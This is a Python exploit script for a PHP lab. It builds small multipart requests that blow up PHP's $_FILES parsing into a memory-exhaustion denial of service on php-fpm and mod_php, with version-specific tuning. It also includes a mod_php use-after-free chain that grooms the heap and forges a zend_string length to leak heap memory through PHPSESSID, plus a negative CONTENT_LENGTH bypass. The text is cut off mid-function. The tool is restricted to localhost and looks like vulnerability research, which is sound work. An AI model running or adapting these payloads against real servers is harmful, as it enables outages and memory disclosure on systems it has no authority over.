#!/usr/bin/env python3
"""
Generic PHP-FPM OOM lab sender (HTTP via nginx, or direct FastCGI).

Payloads
--------
amp (default, the "500x" amplifier) -- multipart/form-data with N file parts:

    Content-Disposition:name=p[]...[k];filename=
    (empty body)

  Byte budget: 880 parts x 63 levels = 206,807B (202KiB) -- under nginx's
  default client_max_body_size (1m) and under Apache's LimitRequestBody
  (0 = unlimited).  Memory: PHP 8.1+ materialises the bracket chain SIX times
  per level (name / full_path / type / tmp_name / error / size in $_FILES),
  measured at 2439-2459B per level => ~128MiB, i.e. ~650x amplification
  (per-level asymptote is 2448/3 = 816x; the rest is per-part framing), which
  exhausts the default memory_limit=128M from a single small request.

  --amp-style safe trades 14% more body (235,616B, ~570x) for the
  conservative quoted `form-data; name="..."; filename=""` shape.

  Why every ingredient matters:
  - filename="" -> the part takes the upload path: no temp file, no
    max_file_uploads slot, but all six $_FILES metadata chains are built;
  - nested name -> each "[k]" (3 wire bytes) allocates a zend_array plus its
    key string per chain; depth stays below max_input_nesting_level=64;
  - max_input_vars -> every part registers as a file variable, and the
    max_input_vars=1000 cap did NOT truncate either shape in testing
    (verified to 12,000 append parts and 1,189 distinct names on 5.6/7.4/8.4).
    Keep the default under 1,000 anyway: hardened builds may enforce it;
  - empty body  -> post_max_size (8M) never trips: the amplification lives in
    parsed metadata, not in the bytes on the wire.

PHP version scaling (5 vs 6 $_FILES chains)
-------------------------------------------
  8.1+       6 chains  ~2448B/level  -> 128M OOMs at ~873 parts
  8.0 / 7.x  5 chains  ~2010B/level  -> 128M OOMs at ~1050 parts
  5.x        5 chains  ~1552B/level  -> 128M OOMs at ~1372 parts
Only 8.1 added the sixth chain (full_path), so 8.0/7.x/5.x buy about 5/6 of
the heap per level (5.x is a little smaller still).  The planner reads
X-Powered-By and scales the part count, so
the same 132MiB target becomes ~898 / ~1094 / ~1416 parts -- all still below
1m of wire.  PHP 5.6 is verified end to end (the max shape parses, and the
OOM surfaces as an empty 200 like 7.x).  Calibrate on a FRESH worker: a
mod_php child already poisoned by an earlier OOM reuses freed chunks and can
look ~4x cheaper than it really is.

SAPI differences (same ~230KiB request, two very different outcomes)
--------------------------------------------------------------------
  nginx + php-fpm : the FPM child OOMs during request startup -> log line
      "child N exited with code 70" -> a fresh child is forked.  Request and
      session globals die with the child, so nothing survives across
      requests: OOM + worker churn (DoS).
  Apache + mod_php: the prefork child OOMs (bailout/longjmp) but STAYS ALIVE
      with RSHUTDOWN skipped, so PS(id) / PS(http_session_vars) are left
      dangling.  A second request on the SAME keep-alive connection (prefork
      pins one connection to one child) runs inside that poisoned worker:
      that is the UAF that grows into a leak / RCE (--payload amp-chain).
  Front-end limits: nginx client_max_body_size (1m) and Apache
      LimitRequestBody (0) are byte counters; neither can see that ~230KiB of
      parsed metadata turns into ~129MiB of Zend heap.

Expected result
---------------
- PHP-FPM: "Allowed memory size ... exhausted" in the body (with nginx
  buffering on it may be 502/empty 200 instead) + "code 70" in the FPM log.
- mod_php: OOM text or 500; with --payload amp-chain additionally a >32-byte
  PHPSESSID (leak) and/or a new SIGSEGV in the container log.
- PHP 5.6 / 7.x: the OOM happens during POST parsing, before the script runs.
  With display_errors off the response is an empty 200 (the fatal only shows
  up in the container log), so the verdict reports LIKELY, not CONFIRMED.
- Patched builds (8.3.36 / 8.4.27 / 8.5.12 and later): no OOM at this size --
  the amplifier itself was removed, not the OOM handling.

Safety
------
Only 127.0.0.1 / localhost / ::1. Lab use only.

Examples
--------
Default (no --payload): same-wire control group, then the 500x amplifier:
    python3 php_oom_generic.py --url http://127.0.0.1:8082/index.php
    python3 php_oom_generic.py --url http://127.0.0.1:8082/index.php --no-control

500x amplifier, explicit (both SAPIs; ~230KiB body, ~570x heap amplification):
    python3 php_oom_generic.py --payload amp \
        --url http://127.0.0.1:8082/index.php            # nginx + php-fpm
    python3 php_oom_generic.py --payload amp \
        --url http://127.0.0.1:8214/index.php            # Apache + mod_php
    python3 php_oom_generic.py --payload amp --fcgi 127.0.0.1:9003 \
        --script /usr/local/lib/php/index.php            # bypass the front end
    # FPM churn count from the container log (code 70):
    python3 php_oom_generic.py --payload amp \
        --url http://127.0.0.1:8082/index.php --docker-container fpm-default-lab-fpm-1

mod_php A/B (OOM poisons the child, B reclaims it on the same connection):
    python3 php_oom_generic.py --payload amp-chain \
        --url http://127.0.0.1:8214/index.php \
        --docker-container p2s-of-8.4.26

oom / modphp-crash (legacy, larger bodies):
    python3 php_oom_generic.py --payload oom --url http://127.0.0.1:8082/index.php
    python3 php_oom_generic.py --payload modphp-crash \
        --url http://127.0.0.1:8112/index.php \
        --restart-container php8511-pure --docker-container php8511-pure

auto -- fingerprint the target and try applicable payloads:
    python3 php_oom_generic.py --payload auto \
        --url http://127.0.0.1:8082/index.php   # nginx/FPM: amp only
    python3 php_oom_generic.py --payload auto \
        --url http://127.0.0.1:8214/index.php   # mod_php: amp-chain, then amp

Direct FastCGI:
    python3 php_oom_generic.py --payload amp --fcgi 127.0.0.1:9003 \
        --script /usr/local/lib/php/peclcmd.php -k 1

Size-limit probe (HTTP, increasing body sizes):
    python3 php_oom_generic.py --probe-sizes \
        --url http://127.0.0.1:8082/index.php \
        --probe-list 0.5,1,2,4,8,16,32
    # 413 = body size limit; 502/503/504 = upstream/proxy;
    # 500 = PHP fatal/OOM; 200+empty = buffered OOM

Same-size control group (HTTP):
    python3 php_oom_generic.py --control \
        --url http://127.0.0.1:8082/index.php \
        --control-size-mb 4.8
    # one normal multipart field of the same size + health check + verdict

Notes
-----
- auto mode uses the Server / X-Powered-By headers:
    nginx            -> amp only (FPM clears state on OOM)
    Apache/mod_php   -> amp-chain (OOM -> UAF probe), then amp
    unknown          -> amp, then amp-chain as a fallback
- amp on nginx+FPM: with 'fastcgi_buffering on' (the default) the OOM may
  arrive as an empty 200 or 502 instead of the fatal text.  That is still
  reported as suspected_oom; add 'fastcgi_buffering off;' for the OOM text.
- PHP 5.x / large-body bypass (direct FastCGI only):
    python3 php_oom_generic.py --payload oom --fcgi 127.0.0.1:9014 \
        --script /var/www/html/index.php \
        --header-lines 1500000 --content-length -1 -k 1
  CONTENT_LENGTH -1 bypasses the PHP 5.x rfc1867 post_max_size check; FPM's
  read_post wraps the negative length and reads until STDIN EOF.  PHP 5.6 may
  return a timeout/broken pipe instead of the fatal error; 8.x returns the
  OOM text.  Without the bypass keep the body under post_max_size (8M is
  ~1.35M header lines).
- payload size vs crash: `--payload oom` (~4.8-7.2MB) is an OOM producer,
  but did NOT produce SIGSEGV on mod_php in our
  tests.  The verified crash chain is `--payload modphp-crash` (~48MB + ~43MB
  at memory_limit=128M): the 11MB nested name is copied ~10x in the startup
  parser, and the 35MB/30MB pads consume the remaining budget.  Smaller OOM
  is not automatically the crash chain.
- modphp-crash mode is for Apache mod_php: it sends 35MB -> 30MB pad and an
  11MB nested empty-filename name over chunked encoding.  It needs a FRESH
  worker; if the workers were already OOMed by earlier runs, it may only OOM.
  Use --restart-container to restart the lab container before the pair.
  --docker-container is used only here, to count SIGSEGV in the crash mode.
"""

from __future__ import annotations

import argparse
import http.client
import math
import os
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.parse

# FastCGI constants
FCGI_BEGIN_REQUEST = 1
FCGI_END_REQUEST = 3
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7
FCGI_RESPONDER = 1

ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}
MAX_CONCURRENCY = 32
OOM_MARKER = b"Allowed memory size"

# --------------------------------------------------------------------------- #
# 500x amplifier constants (measured on 8.3.35 / 8.4.26 / 8.5.11, vulnerable)
# --------------------------------------------------------------------------- #
# A file part (filename="") registers six parallel $_FILES chains per nesting
# level: name, full_path, type, tmp_name, error, size.  Per level that is
# 6 x (HashTable 56B + 8 buckets x 32B + hash 32B + key zend_string 32B),
# measured as 2439-2459B per level on the affected builds.
AMP_BYTES_PER_LEVEL = 2448
#
# Measured ceiling (PHP 8.x defaults): 63 levels is the deepest name
# max_input_nesting_level=64 accepts (64 levels are dropped wholesale), a bare
# "[k]" is 3 wire bytes per level, and 6 chains is fixed by the $_FILES
# attribute list -> asymptote 2448/3 = 816x, reached here as ~650x once the
# per-part framing is amortised over 63 levels.
AMP_MAX_DEPTH = 62               # 63 levels for "p[]" + 62 x "[k]"
AMP_BOUNDARY = b"B"              # 1-byte delimiter line: shortest legal form
AMP_DEFAULT_BUDGET_KB = 1000     # body budget: stay under nginx's 1m default
#
# Two shapes.  "max" is the minimum-wire form measured in the lab:
#   Content-Disposition:name=p[]...[k];filename=
# (no space after the colon, unquoted name, bare filename=, 1-byte boundary,
# append index) -- every byte of framing is 1/650th of the heap it buys.
# "safe" is the conservative ASCII-plain form (quoted, form-data, 4-digit
# index, 20-byte boundary); same memory, ~14% bigger body.
AMP_STYLES = {
    "max": {"depth": 62, "parts": 880, "keylen": 1, "boundary": b"B",
            "index": "append", "disp": "min"},
    "safe": {"depth": 57, "parts": 950, "keylen": 1,
             "boundary": b"----amp500", "index": "pad", "disp": "full"},
}
# $_FILES chain count per PHP generation.  Only 8.1+ has the sixth chain
# (full_path); 8.0, 7.x and 5.x build FIVE.  The cost is the per-level heap
# that counts against memory_limit, measured as an OOM threshold on FRESH
# workers (128M / parts / 63 levels), not the theoretical struct size:
#   8.1+ : name/full_path/type/tmp_name/error/size = 6 chains
#          -> 2448B/level, 128M OOMs at ~873 parts (8.4.26: 870 ok, 880 OOM)
#   8.0  : no full_path yet                        = 5 chains -> ~2010B/level
#   7.x  : 5 chains                                = ~2010B/level
#          -> 128M OOMs at ~1050 parts (7.0/7.4: 1000 ok, 1050 OOM)
#   5.6  : 5 chains                                = ~1552B/level
#          -> 128M OOMs at ~1372 parts (5.6.40: 1350 ok, 1400 OOM)
# Dirty mod_php workers (already poisoned by an earlier OOM) reuse freed
# chunks and can look ~4x cheaper; always calibrate on a fresh worker.
AMP_BYTES_PER_LEVEL_5CHAIN = 2010
AMP_BYTES_PER_LEVEL_BY_MAJOR = {8: AMP_BYTES_PER_LEVEL_5CHAIN,  # 8.0 only
                                7: AMP_BYTES_PER_LEVEL_5CHAIN,
                                5: 1552}
AMP_TARGET_MB = 132              # just above the stock memory_limit=128M

AMP_DISP_PREFIX = b'Content-Disposition: form-data; name="'
AMP_DISP_SUFFIX = b'"; filename=""\r\n'
AMP_CTYPE_LINE = b"Content-Type: text/plain\r\n"
# Zend mmaps its heap in 2MiB chunks; pointers in this window are heap-like.
HEAP_MIN, HEAP_MAX = 0x700000000000, 0x800000000000
CHUNK_MASK = (1 << 21) - 1

_COLOR = False
_VERBOSE = False
_NO_LEGEND = False


def set_color(enabled: bool) -> None:
    global _COLOR
    _COLOR = enabled


def set_verbose(enabled: bool) -> None:
    global _VERBOSE
    _VERBOSE = enabled


def set_legend(enabled: bool) -> None:
    global _NO_LEGEND
    _NO_LEGEND = not enabled


def vprint(*args, **kwargs) -> None:
    """Detail that only matters when debugging the payload (--verbose)."""
    if _VERBOSE:
        print(*args, **kwargs)


LEGEND_RESP = ("[*] fields: status=HTTP/FCGI status | bytes=response size "
               "(bytes) | req=request size (KiB/MiB) | body=response body "
               "(first 160 chars) | note=annotation")
LEGEND_SUM = (
    "[*] fields: sent=requests | oom=OOM text seen | empty200=200 with 0 bytes | "
    "suspected_oom=needs proof | ok=2xx with a body | non200=other status | "
    "errors=transport | statuses=code histogram")


def print_legend(with_summary: bool = False) -> None:
    if _NO_LEGEND:
        return
    print(LEGEND_RESP)
    if with_summary:
        print(LEGEND_SUM)


def _status_color(status, mode: str) -> str:
    """2xx (or FCGI 0) dim/green; anything else is an anomaly -> red."""
    if status is None:
        return "1;31"
    if mode == "fcgi":
        return "2" if status == 0 else "1;31"
    try:
        return "2" if 200 <= int(status) < 300 else "1;31"
    except (TypeError, ValueError):
        return "1;31"


def _ok_status(status, mode: str) -> bool:
    if status is None:
        return False
    if mode == "fcgi":
        return status == 0
    try:
        return 200 <= int(status) < 300
    except (TypeError, ValueError):
        return False


def response_fields(status, data: bytes, err: str, note: str = "",
                    mode: str = "http") -> list:
    """Key=value fields for one response, with anomalies highlighted.

    dim     : normal (2xx / body text)
    yellow  : suspicious (0-byte 200, note)         <- hidden fatal
    red     : abnormal (413 / 5xx / transport error)
    green   : the finding itself ("Allowed memory size" in the body)
    """
    empty = not err and not data and _ok_status(status, mode)
    fields = [
        f"status={clr(status_label(status, mode), _status_color(status, mode))}",
        f"bytes={clr(len(data), '1;33' if empty else '2')}",
    ]
    if err:
        fields.append(f"error={clr(repr(err), '1;31')}")
    if note:
        fields.append(f"note={clr(note, '1;33')}")
    if data:
        colour = "1;32" if OOM_MARKER in data else "2"
        fields.append("body=" + clr(body_preview(data), colour))
    return fields


def body_preview(data: bytes, limit: int = 160) -> str:
    """Response body as readable text (`"..."`), with a truncation marker."""
    text = data[:limit].decode("utf-8", "backslashreplace")
    out = repr(text)
    if len(data) > limit:
        out += "..."
    return out


def status_label(status, mode: str = "http") -> str:
    """Unambiguous status text: 'HTTP 200' / 'FCGI 0' / 'HTTP None'."""
    if status is None:
        return "FCGI ---" if mode == "fcgi" else "HTTP ---"
    if mode == "fcgi":
        return f"FCGI {status}"
    return f"HTTP {status}"


def resp_line(idx: int, status, data: bytes, err: str,
              note: str = "", mode: str = "http") -> str:
    """One line per response, every value under an explicit key.

    The classification is not printed: the raw status + size + body say it all,
    and the verdict line states the conclusion (CONFIRMED / LIKELY OOM / ...).
    """
    fields = response_fields(status, data, err, note, mode)
    return clr(f"[request {idx:04d}]", "2") + "  " + "  ".join(fields)


def clr(text, code: str) -> str:
    """ANSI color helper; no-op when color is disabled."""
    text = str(text)
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def oom_text(flag: bool) -> str:
    # bold green when the OOM marker is present, dim when it is not
    return clr("oom=True", "1;32") if flag else clr("oom=False", "2")


def bool_text(flag: bool, code: str = "1;33") -> str:
    return clr(str(flag), code) if flag else clr(str(flag), "2")


def parse_php_version(powered_by: str):
    """Extract (major, minor) from an X-Powered-By header, or None."""
    if not powered_by:
        return None
    for token in powered_by.replace(",", " ").split():
        if token.upper().startswith("PHP/"):
            bits = token[4:].split(".")
            try:
                return int(bits[0]), int(bits[1]) if len(bits) > 1 else 0
            except ValueError:
                return None
    return None


def amp_level_cost(version):
    """Return (chains, bytes_per_level) for the target PHP generation.

    8.1+ registers a sixth $_FILES chain (full_path); 8.0, 7.x and 5.x build
    five, so the same body buys 5/6 of the heap there.  The numbers are
    measured OOM thresholds on fresh workers (see the table above).
    """
    if version is None:
        return 6, AMP_BYTES_PER_LEVEL
    major, minor = version
    if major > 8 or (major == 8 and minor >= 1):
        return 6, AMP_BYTES_PER_LEVEL
    if major in (8, 7):
        return 5, AMP_BYTES_PER_LEVEL_5CHAIN
    if major == 5:
        return 5, AMP_BYTES_PER_LEVEL_BY_MAJOR[5]
    # Unknown future/legacy build: assume the 6-chain shape; --amp-retries
    # and --amp-bytes-per-level are the escape hatches.
    return 6, AMP_BYTES_PER_LEVEL


KIND_COLORS = {
    "OOM": "1;32",         # green  : the fatal text reached the client
    "EMPTY200": "1;33",    # yellow : 200 + 0 bytes -> fatal hidden / buffered
    "FATAL500": "1;31",    # red    : 500 without the marker
    "TOO_LARGE": "1;31",   # red    : 413 front-end body limit
    "UPSTREAM": "1;31",    # red    : 502/503/504
    "ERROR": "1;31",       # red    : transport error
    "OK": "2",             # dim    : a normal response
}


def resp_kind(status, data: bytes, error: str = "") -> str:
    """One label per response, so the summary cannot contradict itself.

    OOM      fatal text in the body (reliable)
    EMPTY200 200 with a zero-byte body: PHP died with display_errors=Off, or a
             buffering front end ate the fatal -- the OOM *symptom*, not proof
    FATAL500 500 with no marker (display_errors=Off + Apache status mapping)
    TOO_LARGE/UPSTREAM/ERROR/OK -- as their names say
    """
    if error:
        return "ERROR"
    if OOM_MARKER in data:
        return "OOM"
    if status == 200 and not data:
        return "EMPTY200"
    if status == 413:
        return "TOO_LARGE"
    if status in (502, 503, 504):
        return "UPSTREAM"
    if status == 500:
        return "FATAL500"
    if status in (200, 201, 202, 204, 206):
        return "OK"
    return f"HTTP{status}"


def kind_text(kind: str) -> str:
    return clr(kind, KIND_COLORS.get(kind, "1;33"))


def human_size(n: int) -> str:
    if n >= 1024 * 1024:
        return f"{n / (1024 * 1024):.2f}MiB"
    if n >= 1024:
        return f"{n / 1024:.1f}KiB"
    return f"{n}B"


# --------------------------------------------------------------------------- #
# Payload
# --------------------------------------------------------------------------- #
def build_body(boundary: bytes, pad_mb: float = 0.0,
               header_lines: int = 0) -> bytes:
    """Normal-field control body and the header-line flood body.

    pad_mb       one normal multipart field of that many MiB (1:1 memory)
    header_lines one part whose header block has that many `a: b` lines
                 (~300B mime_header_entry per 6B line)
    """
    out = bytearray()
    if pad_mb > 0:
        # A normal field: multipart_buffer_read_body() accumulates it in memory.
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="pad"\r\n\r\n'
        out += b"A" * int(pad_mb * 1024 * 1024)
        out += b"\r\n"
    if header_lines > 0:
        # Header-line amplification: the multipart parser builds a
        # mime_header_entry per line (~300B per 6B wire line).
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="x"\r\n'
        out += b"a: b\r\n" * header_lines
        out += b"\r\nx\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# --------------------------------------------------------------------------- #
# 500x amplifier: planner + bodies
# --------------------------------------------------------------------------- #
def amp_plan(parts: int, depth: int, keylen: int, budget_kb: int,
             *, session: bool = False, part_content_type: bool = False,
             boundary: bytes = AMP_BOUNDARY, style: str = "max",
             bytes_per_level: int = AMP_BYTES_PER_LEVEL) -> dict:
    """Fit the amplifier shape to a wire budget and predict its heap cost.

    The parts/depth knobs have two hard ceilings on the PHP side:
    max_input_vars (1000 top-level variables) and max_input_nesting_level
    (64).  The wire budget has a front-end ceiling: nginx
    client_max_body_size defaults to 1m, Apache LimitRequestBody to 0
    (unlimited) -- a hardened Apache may still cap it, so keep the default
    budget at ~1MB.
    """
    parts = max(1, min(int(parts), 10000))
    depth_in, keylen_in = depth, keylen
    depth = max(0, min(int(depth), AMP_MAX_DEPTH))
    keylen = max(1, min(int(keylen), 4096))
    budget = max(4, int(budget_kb)) * 1024

    close = len(b"--" + boundary + b"--\r\n")
    fixed = len(_amp_session_prefix(boundary)) if session else 0
    per_part = amp_part_bytes(depth, keylen, boundary, style=style,
                              part_content_type=part_content_type)

    room = max(per_part, budget - close - fixed)
    fitted = max(1, min(parts, room // per_part))
    wire = fixed + fitted * per_part + close
    levels = depth + 1                      # the top-level name is level 1
    est_heap = fitted * levels * bytes_per_level
    return {
        "parts": fitted,
        "parts_requested": parts,
        "depth": depth,
        "depth_requested": int(depth_in),
        "keylen": keylen,
        "keylen_requested": int(keylen_in),
        "levels": levels,
        "per_part": per_part,
        "wire": wire,
        "budget": budget,
        "est_heap": est_heap,
        "ratio": (est_heap / wire) if wire else 0.0,
        "shrunk": fitted != parts,
        "style": style,
        "bytes_per_level": bytes_per_level,
    }


def amp_part_bytes(depth: int, keylen: int, boundary: bytes, *,
                   part_content_type: bool = False,
                   style: str = "max") -> int:
    """Exact wire cost of one amplifier part.

    style=max  name is `<top>[]` + depth x `[k]` (append index), and the part
               header is the minimum the parser accepts:
               `Content-Disposition:name=<name>;filename=`  (25 + name + 11)
    style=safe quoted `form-data; name="..."` + `; filename=""` + fixed-width
               index, i.e. what a strict/older parser expects.
    """
    if style == "max":
        name_len = 3 + depth * (2 + keylen)          # "p[]" + depth x "[k]"
        return (len(b"--") + len(boundary) + len(b"\r\n")
                + len(b"Content-Disposition:name=") + name_len
                + len(b";filename=")
                + len(b"\r\n\r\n\r\n"))     # headers, blank line, trailer
    name_len = 5 + depth * (2 + keylen)              # "p0000" + depth x "[k]"
    return (len(b"--") + len(boundary) + len(b"\r\n")
            + len(AMP_DISP_PREFIX) + name_len + len(AMP_DISP_SUFFIX)
            + (len(AMP_CTYPE_LINE) if part_content_type else 0)
            + len(b"\r\n")      # blank line ending the headers
            + len(b"\r\n"))     # part terminator


def _amp_session_prefix(boundary: bytes) -> bytes:
    """PHPSESSID + upload-progress fields.

    These are what drag ext/session into request startup, so the OOM happens
    with the upload-progress state half-built (the mod_php UAF condition).
    For plain OOM detection they are optional but harmless.
    """
    return (b"--" + boundary + b"\r\n"
            + b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n\x00\r\n'
            + b"--" + boundary + b"\r\n"
            + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
            + b"\r\n\r\nppp\r\n")


def build_amp_body(parts: int, depth: int, keylen: int,
                   boundary: bytes = AMP_BOUNDARY, *,
                   session: bool = False,
                   part_content_type: bool = False,
                   style: str = "max") -> bytes:
    """The ~230KiB body that costs PHP ~129MiB at the default memory_limit.

    Shape: N file parts whose names are `p0000[k][k]...[k]` with an EMPTY
    filename.  filename="" is the multiplier: it routes the part through the
    $_FILES upload path (six metadata chains per level) instead of the single
    $_POST chain, while writing no temp file and consuming no
    max_file_uploads slot.
    """
    key = "k" * keylen
    suffix = "".join(f"[{key}]" for _ in range(depth))
    out = bytearray()
    if session:
        out += _amp_session_prefix(boundary)
    for i in range(parts):
        name = (f"p[]{suffix}" if style == "max"
                else f"p{i:04d}{suffix}")
        out += b"--" + boundary + b"\r\n"
        if style == "max":
            # Minimum a PHP parser still accepts: no `form-data`, no space
            # after the colon, unquoted name, bare `filename=`.  Verified on
            # 8.1.31 / 8.3.35 / 8.4.26 / 8.5.11 (all still build 6 chains).
            out += (b"Content-Disposition:name=" + name.encode()
                    + b";filename=\r\n")
        else:
            out += AMP_DISP_PREFIX + name.encode() + AMP_DISP_SUFFIX
            if part_content_type:
                out += AMP_CTYPE_LINE
        out += b"\r\n\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def build_amp_consumer(boundary: bytes = AMP_BOUNDARY, *,
                       fill: int = 51, length: int = 256) -> bytes:
    """The B request of the mod_php pair: reclaim the poisoned worker.

    Shape ported from the StealMyBitcoin heap-consumer (calibrated on Alpine
    PHP 8.4 with four workers): repeat a numeric key to steer the allocation
    pattern, then plant a forged zend_string header whose length field is 256
    so PHP serialises 256 bytes of neighbouring heap into PHPSESSID.

    `fill` and `length` are the two groom knobs: the filler count shifts what
    the allocations land on, the forged length decides how much is disclosed.
    It is a *probe*, not a guaranteed hit -- the right pair is image-specific.
    """
    out = bytearray()
    out += b"--" + boundary + b"\r\n"
    out += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\na\r\n'
    out += b"--" + boundary + b"\r\n"
    out += (b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
            b"\r\n\r\npwn\r\n")
    for i in range(fill):
        value = (f"v{i:04d}".encode() + b"x" * 48)[:48]
        out += b"--" + boundary + b"\r\n"
        out += (AMP_DISP_PREFIX + str(1000 + i).encode() + b'"\r\n\r\n'
                + value + b"\r\n")
    out += b"--" + boundary + b"\r\n"
    out += AMP_DISP_PREFIX + b'1050"\r\n\r\n' + b"Z" * 128 + b"\r\n"
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, 0x10, length)   # forged zend_string length
    forged[0x18] = ord("L")
    out += b"--" + boundary + b"\r\n"
    out += AMP_DISP_PREFIX + b'1999"\r\n\r\n' + bytes(forged) + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# Groom sweep for --chain-probes: (filler count, forged length).  The first
# entry is the vanilla StealMyBitcoin shape; the rest shift the allocation
# pattern by a few buckets / change how much is disclosed.
AMP_CHAIN_SHAPES = ((51, 256), (32, 256), (64, 512), (0, 128), (80, 256),
                    (16, 512), (96, 256), (40, 128))


def scan_heap_pointers(blob: bytes) -> list:
    """Count pointer-looking little-endian words per 2MiB Zend chunk base.

    Same idea as the PoC's heap_candidate(): try every byte alignment and
    require several words to agree on one aligned chunk before believing it.
    """
    found = {}
    for align in range(8):
        for pos in range(align, len(blob) - 7, 8):
            value = struct.unpack_from("<Q", blob, pos)[0]
            if HEAP_MIN <= value < HEAP_MAX:
                base = value & ~CHUNK_MASK
                found[base] = found.get(base, 0) + 1
    return sorted(found.items(), key=lambda kv: -kv[1])


def extract_phpsessid(headers: dict) -> bytes:
    """Pull the PHPSESSID value out of a Set-Cookie header (decoded bytes)."""
    raw = headers.get("set-cookie", "")
    for chunk in raw.split(","):
        for kv in chunk.split(";"):
            kv = kv.strip()
            if kv.upper().startswith("PHPSESSID="):
                return urllib.parse.unquote_to_bytes(kv.split("=", 1)[1])
    return b""


# --------------------------------------------------------------------------- #
# HTTP sender (nginx -> FPM)
# --------------------------------------------------------------------------- #
def send_http(url: str, body: bytes, boundary: bytes, timeout: float):
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        "Content-Length": str(len(body)),
        "Connection": "close",
    }
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        return resp.status, data, ""
    except OSError as exc:
        return None, b"", str(exc)
    finally:
        conn.close()


def send_http_probe(url: str, body: bytes, boundary: bytes, timeout: float):
    """HTTP send that also returns response headers (for size-limit probing)."""
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        "Content-Length": str(len(body)),
        "Connection": "close",
    }
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, data, "", hdrs
    except OSError as exc:
        return None, b"", str(exc), {}
    finally:
        conn.close()


def send_http_raw(url: str, body: bytes, content_type: str, timeout: float):
    """Generic HTTP POST; returns (status, body, error, headers)."""
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {
        "Content-Type": content_type,
        "Content-Length": str(len(body)),
        "Connection": "close",
    }
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, data, "", hdrs
    except OSError as exc:
        return None, b"", str(exc), {}
    finally:
        conn.close()


def send_http_get(url: str, timeout: float):
    """Health-check GET; returns (status, body, error, headers)."""
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path, headers={"Connection": "close"})
        resp = conn.getresponse()
        data = resp.read()
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, data, "", hdrs
    except OSError as exc:
        return None, b"", str(exc), {}
    finally:
        conn.close()


def _probe_note(status, data: bytes, error: str) -> str:
    if error:
        return "connection dropped / reset (possible OOM/crash or proxy reset)"
    if status == 413:
        return "BODY SIZE LIMIT (413: client_max_body_size / LimitRequestBody)"
    if status in (502, 503, 504):
        return ("UPSTREAM UNAVAILABLE / FPM pool exhausted / proxy limit "
                "(502/503/504)")
    if status == 500:
        return "PHP fatal/OOM (500; display_errors may hide the text)"
    if status == 200 and not data:
        return "empty 200 (buffered OOM or normal empty response)"
    if status == 200:
        return "accepted"
    return ""


def run_probe_sizes(args) -> int:
    """Send increasing body sizes and show status/Server to find size limits."""
    if not args.url:
        print("[!] --probe-sizes requires --url (HTTP)", file=sys.stderr)
        return 2
    host = (urllib.parse.urlsplit(args.url).hostname or "").lower()
    try:
        sizes = [float(x) for x in args.probe_list.split(",") if x.strip()]
    except ValueError:
        print("[!] --probe-list must be comma-separated numbers (MiB)",
              file=sys.stderr)
        return 2
    if not sizes or any(s < 0 or s > 256 for s in sizes):
        print("[!] probe sizes must be 0..256 MiB", file=sys.stderr)
        return 2

    print(f"[*] size probe target={args.url} sizes={sizes} MiB")
    print("[*] 413=size limit; 502/503/504=upstream/proxy; "
          "500=PHP fatal/OOM; 200+empty=buffered OOM")
    for mb in sizes:
        boundary = b"----probe-" + os.urandom(6).hex().encode()
        body = build_body(boundary, pad_mb=mb)
        status, data, error, hdrs = send_http_probe(
            args.url, body, boundary, args.timeout
        )
        server = hdrs.get("server", "")
        ctype = hdrs.get("content-type", "")
        note = _probe_note(status, data, error)
        print(
            f"[probe] {mb:>6.1f}MiB body={len(body):>9}B "
            f"({human_size(len(body))}) status={status} "
            f"resp={len(data)}B server={server!r} ctype={ctype!r} "
            f"note={note} err={error!r}",
            flush=True,
        )
        if data:
            n = args.body_bytes if args.body_bytes > 0 else 300
            print(f"        head={data[:min(n, 300)]!r}", flush=True)
    return 0


def run_control(args) -> int:
    """Same-size normal-upload control.

    Sends ONE normal multipart field of --control-size-mb and a health GET
    before/after.  If this succeeds but the header-amplification payload
    fails, the failure is shape-specific (parser OOM), not a size limit.
    """
    if not args.url:
        print("[!] --control requires --url (HTTP)", file=sys.stderr)
        return 2
    if args.control_size_mb <= 0 or args.control_size_mb > 256:
        print("[!] --control-size-mb must be 0..256", file=sys.stderr)
        return 2

    health_url = args.health_url or args.url
    boundary = b"----control-" + os.urandom(6).hex().encode()
    mp = f"multipart/form-data; boundary={boundary.decode()}"
